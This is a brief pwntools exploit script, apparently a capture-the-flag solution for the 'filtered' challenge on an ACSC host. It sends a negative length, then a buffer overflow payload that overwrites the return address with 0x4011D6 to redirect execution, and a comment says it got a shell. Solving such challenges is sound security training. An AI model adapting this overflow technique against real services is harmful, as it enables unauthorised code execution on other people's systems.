from pwn import *

p = remote("filtered.chal.acsc.asia", 9001)

p.sendline(b"-1")

payload = b"A" * 0x100
payload += p64(0x4011D6) * 4
p.sendline(payload)

p.interactive() # Got a shell
